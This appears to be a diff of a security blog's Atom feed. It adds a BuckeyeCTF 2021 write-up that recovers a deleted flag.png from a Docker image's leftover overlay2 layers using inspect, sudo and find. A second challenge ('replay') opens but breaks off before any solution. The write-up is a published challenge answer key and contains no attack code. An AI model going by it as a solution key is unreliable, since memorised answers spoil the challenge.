@@ -1,4 +1,403 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-09-18T18:08:27-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">N1TP</title><link href="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html" rel="alternate" type="text/html" title="N1TP" /><published>2021-09-18T17:25:21-05:00</published><updated>2021-09-18T17:25:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/09/18/HacktivityCon2021-N1TP.html">&lt;h1&gt;&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-10-24T22:47:30-05:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;当て身 Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; 👊 &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; 👊 &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; 👊 &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">layers</title><link href="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers.html" rel="alternate" type="text/html" title="layers" /><published>2021-10-24T22:06:42-05:00</published><updated>2021-10-24T22:06:42-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-layers.html">&lt;h1&gt;&lt;/h1&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Challenge Text: &lt;/font&gt;&lt;/h3&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Author: qxxxb
+
+Check out my brand new docker repo https://hub.docker.com/r/qxxxb/layers
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Solution: &lt;/font&gt;&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Navigating to the site provided we’re provided with a docker image to pull:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/BuckeyeCTF2021/50e68d39a21a5e9a267b120edf7c8a4b.png&quot; alt=&quot;50e68d39a21a5e9a267b120edf7c8a4b.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Checking out the image we discover that it seems as if a file named flag.png once existed inside, but no longer does:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker pull qxxxb/layers
+&lt;span class=&quot;go&quot;&gt;Using default tag: latest
+latest: Pulling from qxxxb/layers
+a0d0a0d46f8b: Pull complete 
+9a653c77c575: Pull complete 
+5b35be6cf17d: Pull complete 
+5895c1ac3aab: Pull complete 
+Digest: sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2
+Status: Downloaded newer image for qxxxb/layers:latest
+docker.io/qxxxb/layers:latest
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker images
+&lt;span class=&quot;go&quot;&gt;REPOSITORY      TAG       IMAGE ID       CREATED         SIZE
+qxxxb/layers    latest    0c01a25ae5b7   5 days ago      6.19MB
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; qxxxb/layers
+&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;root
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;total 72
+drwxr-xr-x    1 root     root          4096 Oct 25 00:51 .
+drwxr-xr-x    1 root     root          4096 Oct 25 00:51 ..
+-rwxr-xr-x    1 root     root             0 Oct 25 00:51 .dockerenv
+-rw-rw-r--    1 root     root           124 Oct 19 15:26 Dockerfile
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 bin
+drwxr-xr-x    5 root     root           360 Oct 25 00:51 dev
+drwxr-xr-x    1 root     root          4096 Oct 25 00:51 etc
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 home
+drwxr-xr-x    7 root     root          4096 Aug 27 11:05 lib
+drwxr-xr-x    5 root     root          4096 Aug 27 11:05 media
+-rw-r--r--    1 root     root            36 Oct 19 15:26 message.txt
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 mnt
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 opt
+dr-xr-xr-x  306 root     root             0 Oct 25 00:51 proc
+drwx------    1 root     root          4096 Oct 25 00:51 root
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 run
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 sbin
+drwxr-xr-x    2 root     root          4096 Aug 27 11:05 srv
+dr-xr-xr-x   13 root     root             0 Oct 25 00:51 sys
+drwxrwxrwt    2 root     root          4096 Aug 27 11:05 tmp
+drwxr-xr-x    7 root     root          4096 Aug 27 11:05 usr
+drwxr-xr-x   12 root     root          4096 Aug 27 11:05 var
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;message.txt 
+&lt;span class=&quot;go&quot;&gt;Sorry, the flag has been deleted :(
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Dockerfile 
+&lt;span class=&quot;go&quot;&gt;FROM alpine:latest
+COPY flag.png Dockerfile /
+RUN rm flag.png
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;RUN echo &quot;Sorry, the flag has been deleted :(&quot; &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/message.txt
+&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;^C
+&lt;span class=&quot;gp&quot;&gt;/ #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Checking the image history, it doesn’t seem as if we can’t easily just revert to previous layers because we didn’t build this ourselves locally:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;history &lt;/span&gt;qxxxb/layers
+&lt;span class=&quot;go&quot;&gt;IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
+0c01a25ae5b7   5 days ago    /bin/sh -c echo &quot;Sorry, the flag has been de…   36B       
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;lt;missing&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;5 days ago    /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;flag.png                          0B        
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;missing&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;5 days ago    /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop) COPY multi:6b3bd56201fda03…   599kB     &lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;missing&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;8 weeks ago   /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop)  CMD [&quot;/bin/sh&quot;]              0B        &lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;&amp;lt;missing&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;8 weeks ago   /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#(nop) ADD file:aad4290d27580cc1a…   5.6MB  &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;However, digging a bit deeper we notice that the previous layers appear to have some artifacts left over that we can find on our local machine in /var/lib/docker/overlay2/:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker inspect qxxxb/layers                                                                                             
+&lt;span class=&quot;go&quot;&gt;[
+    {
+        &quot;Id&quot;: &quot;sha256:0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9&quot;,
+        &quot;RepoTags&quot;: [
+            &quot;qxxxb/layers:latest&quot;
+        ],
+        &quot;RepoDigests&quot;: [
+            &quot;qxxxb/layers@sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2&quot;
+        ],
+        &quot;Parent&quot;: &quot;&quot;,
+        &quot;Comment&quot;: &quot;&quot;,
+        &quot;Created&quot;: &quot;2021-10-19T15:26:49.240573536Z&quot;,
+        &quot;Container&quot;: &quot;f6fb5543fac6f92af65af594f2547a659761eecfa1cafd720d631e6ca2bb0e1e&quot;,
+        &quot;ContainerConfig&quot;: {
+            &quot;Hostname&quot;: &quot;&quot;,
+            &quot;Domainname&quot;: &quot;&quot;,
+            &quot;User&quot;: &quot;&quot;,
+            &quot;AttachStdin&quot;: false,
+            &quot;AttachStdout&quot;: false,
+            &quot;AttachStderr&quot;: false,
+            &quot;Tty&quot;: false,
+            &quot;OpenStdin&quot;: false,
+            &quot;StdinOnce&quot;: false,
+            &quot;Env&quot;: [
+                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+            ],
+            &quot;Cmd&quot;: [
+                &quot;/bin/sh&quot;,
+                &quot;-c&quot;,
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;                &quot;echo \&quot;Sorry, the flag has been deleted :(\&quot; &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/message.txt&lt;span class=&quot;s2&quot;&gt;&quot;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;            ],
+            &quot;Image&quot;: &quot;sha256:d6aa6df23fb1b311908fad5a8eb92626650ece786144bc04e6ca02a3807fb02e&quot;,
+            &quot;Volumes&quot;: null,
+            &quot;WorkingDir&quot;: &quot;&quot;,
+            &quot;Entrypoint&quot;: null,
+            &quot;OnBuild&quot;: null,
+            &quot;Labels&quot;: null
+        },
+        &quot;DockerVersion&quot;: &quot;20.10.6&quot;,
+        &quot;Author&quot;: &quot;&quot;,
+        &quot;Config&quot;: {
+            &quot;Hostname&quot;: &quot;&quot;,
+            &quot;Domainname&quot;: &quot;&quot;,
+            &quot;User&quot;: &quot;&quot;,
+            &quot;AttachStdin&quot;: false,
+            &quot;AttachStdout&quot;: false,
+            &quot;AttachStderr&quot;: false,
+            &quot;Tty&quot;: false,
+            &quot;OpenStdin&quot;: false,
+            &quot;StdinOnce&quot;: false,
+            &quot;Env&quot;: [
+                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+            ],
+            &quot;Cmd&quot;: [
+                &quot;/bin/sh&quot;
+            ],
+            &quot;Image&quot;: &quot;sha256:d6aa6df23fb1b311908fad5a8eb92626650ece786144bc04e6ca02a3807fb02e&quot;,
+            &quot;Volumes&quot;: null,
+            &quot;WorkingDir&quot;: &quot;&quot;,
+            &quot;Entrypoint&quot;: null,
+            &quot;OnBuild&quot;: null,
+            &quot;Labels&quot;: null
+        },
+        &quot;Architecture&quot;: &quot;amd64&quot;,
+        &quot;Os&quot;: &quot;linux&quot;,
+        &quot;Size&quot;: 6194599,
+        &quot;VirtualSize&quot;: 6194599,
+        &quot;GraphDriver&quot;: {
+            &quot;Data&quot;: {
+                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff:/var/lib/docker/overlay2/aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff:/var/lib/docker/overlay2/6486d308eb4271abb881399b0f032c264a0296ad7612a1a82b41488a52eab8bb/diff&quot;,
+                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/merged&quot;,
+                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/diff&quot;,
+                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c/work&quot;
+            },
+            &quot;Name&quot;: &quot;overlay2&quot;
+        },
+        &quot;RootFS&quot;: {
+            &quot;Type&quot;: &quot;layers&quot;,
+            &quot;Layers&quot;: [
+                &quot;sha256:e2eb06d8af8218cfec8210147357a68b7e13f7c485b991c288c2d01dc228bb68&quot;,
+                &quot;sha256:a6951987fab1e53365680416db4c728a89783aa2b8c39bd2879aabfcffab95d9&quot;,
+                &quot;sha256:3d2c9f04c82dbb90411e102ed7e2e49b412b03e2f0021a40d3af818e02cdd0f7&quot;,
+                &quot;sha256:50d11bbfd2f65f57406491bdd23baad9a62672b8080d243a590c37e7dc7eab73&quot;
+            ]
+        },
+        &quot;Metadata&quot;: {
+            &quot;LastTagTime&quot;: &quot;0001-01-01T00:00:00Z&quot;
+        }
+    }
+]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We know we are searching for flag.png in one of these directories.  Navigating to /var/lib/docker/overlay2/ we hit a bit of a minor roadblock that won’t be a problem on our own machine:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/lib/docker/overlay2/
+&lt;span class=&quot;go&quot;&gt;
+┌──(shinris3n㉿kodachi)-[/var/lib/docker/overlay2]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;                                                                                                                             
+&lt;span class=&quot;go&quot;&gt;ls: cannot open directory '.': Permission denied
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Trying this with elevated permissions, then searching via find for flag.png yields:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[/var/lib/docker/overlay2]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/lib/docker/overlay2/                                                                                          
+&lt;span class=&quot;go&quot;&gt;total 76
+drwx-----x 19 root root 4096 Oct 24 20:51 .
+drwx--x--x 14 root root 4096 Sep 18 15:58 ..
+drwx-----x  3 root root 4096 Jun  5 17:36 0c8211388805bd110c14a5156da4abefe9237cd11050d179f6870f092de974a7
+drwx-----x  4 root root 4096 Jun  5 17:36 1d678d5825ea88e14b70dab71f24b46fbff22643294b4be6a0672632f188e68f
+drwx-----x  3 root root 4096 Oct 24 20:49 6486d308eb4271abb881399b0f032c264a0296ad7612a1a82b41488a52eab8bb
+drwx-----x  4 root root 4096 Oct 24 20:51 7b89f934aa1d9b1286d9ff09037b8f4cd25f3116e9ebdd30aa89b5be18fb01cd
+drwx-----x  4 root root 4096 Oct 24 20:51 7b89f934aa1d9b1286d9ff09037b8f4cd25f3116e9ebdd30aa89b5be18fb01cd-init
+drwx-----x  4 root root 4096 Oct 24 20:52 85850942fb425900d8354347b0f0233a63ddd8c226d88400138a740323d43569
+drwx-----x  4 root root 4096 Oct 24 20:51 85850942fb425900d8354347b0f0233a63ddd8c226d88400138a740323d43569-init
+drwx-----x  4 root root 4096 Jun  5 17:44 9a3d5ee146d1f52b551c49977384f451e1f1a9fb9f7a52ea055a6439f6c5dfe8
+drwx-----x  4 root root 4096 Jun  5 17:36 9a3d5ee146d1f52b551c49977384f451e1f1a9fb9f7a52ea055a6439f6c5dfe8-init
+drwx-----x  4 root root 4096 Oct 24 20:49 a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93
+drwx-----x  4 root root 4096 Jun  5 17:36 a76762e01180981bc7f9cf2ce77627c151d1155c2d7fa023a44c467d09493cd7
+drwx-----x  4 root root 4096 Oct 24 20:49 aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a
+drwx-----x  4 root root 4096 Jun  5 17:36 ae4f50325c02c2387e3b39a797391617a633d3bc4144c5bb0b188b98b1ed2ba8
+drwx-----x  4 root root 4096 Oct 24 20:51 b93b559c421b5ec21015b2339e968457bcdbd7703f8c4181c6403db220ba7d5c
+drwx-----x  4 root root 4096 Jun  5 17:36 f9b87476e0cbfa8f0fab138781000c9f3c802e3350017e9facb9316feb4d44b1
+drwx-----x  4 root root 4096 Jun  5 17:36 f9beca8f465f8ed70023d2297d975c6cd6b5a1490df9cf46c91627d0bd470538
+drwx-----x  2 root root 4096 Oct 24 20:51 l
+
+┌──(shinris3n㉿kodachi)-[/var/lib/docker/overlay2]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;find &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag.png&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;./aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff/flag.png
+./a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Trying to copy these files over to our home directory and opening them up is only successful for one of the two files.  (Inspecting the one that failed, the flag.png file appears to have the “c” (Character Device / Special File) permission set, which is not readable).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; /var/lib/docker/overlay2/aa2bcbd0951a0e898cb73e412ab47c09d77fc753c0947022e1fb0edfcc3cc08a/diff/flag.png ./flag1.png    
+&lt;span class=&quot;go&quot;&gt;
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cp&lt;/span&gt; /var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png ./flag2.png
+&lt;span class=&quot;go&quot;&gt;cp: cannot open '/var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/flag.png' for reading: No such device or address
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /var/lib/docker/overlay2/a53ad803fcada3d5c4c3ad52b01d540c8d8a9358a46662dede804860ca9eba93/diff/                    
+&lt;span class=&quot;go&quot;&gt;total 8
+drwxr-xr-x 2 root root 4096 Oct 24 20:49 .
+drwx-----x 4 root root 4096 Oct 24 20:49 ..
+c--------- 1 root root 0, 0 Oct 24 20:49 flag.png
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Opening the file that successfully copied over (flag1.png) yields the flag:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/BuckeyeCTF2021/373e23d292d39718b55e9934358780e0.png&quot; alt=&quot;373e23d292d39718b55e9934358780e0.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can now clean up any docker containers that are still running along with the image:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;                                                                                                                  
+&lt;span class=&quot;go&quot;&gt;CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS                        PORTS     NAMES
+6e978af16952   qxxxb/layers           &quot;/bin/sh&quot;                57 minutes ago   Exited (130) 56 minutes ago             thirsty_rubin
+d57ae7d74a36   qxxxb/layers           &quot;/bin/sh&quot;                57 minutes ago   Exited (0) 57 minutes ago               strange_bell
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;thirsty_rubin                                                                                                       
+&lt;span class=&quot;go&quot;&gt;thirsty_rubin 
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;strange_bell                                                                                                         
+&lt;span class=&quot;go&quot;&gt;strange_bell
+
+┌──(shinris3n㉿kodachi)-[~/sec/CTFs/BuckeyeCTF2021/misc/layers]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;└─$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;docker rmi qxxxb/layers
+&lt;span class=&quot;go&quot;&gt;Untagged: qxxxb/layers:latest
+Untagged: qxxxb/layers@sha256:a89678536727abc0fbfe693b19ac0f8454502351dc792dabbee47bc9ab7420b2
+Deleted: sha256:0c01a25ae5b745b06c68c7b870b848f327227e06feca8f121c105d3cc423ebc9
+Deleted: sha256:34019abf87be9b68f1c90cc76b3d0c0b1c44aeb562f7745a54e1a47caf94f310
+Deleted: sha256:fb972cfd15deb064bddfb9b7ed3718a78539b569f7cb604d7472ba64910cf9c8
+Deleted: sha256:6d6c9aade1a3240edecab64e3d7ab6eeef677ef9570992191d55ccaab1039e4e
+Deleted: sha256:e2eb06d8af8218cfec8210147357a68b7e13f7c485b991c288c2d01dc228bb68
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="BuckeyeCTF2021" /><category term="docker" /><summary type="html">Challenge Text:</summary></entry><entry><title type="html">replay</title><link href="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay.html" rel="alternate" type="text/html" title="replay" /><published>2021-10-24T21:31:21-05:00</published><updated>2021-10-24T21:31:21-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/10/24/Buckeye2021-replay.html">&lt;h1&gt;&lt;/h1&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Challenge Text: &lt;/font&gt;&lt;/h3&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Author: qxxxb
+
+Somebody pwned my app! Luckily I managed to capture the network traffic of their exploit.
+Oh by the way, the same app is also running on misc.chall.pwnoh.io on port 13371. 
+Can you pwn it for me?
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3&gt;&lt;font color=&quot;FF3030&quot;&gt; Solution: &lt;/font&gt;&lt;/h3&gt;
+
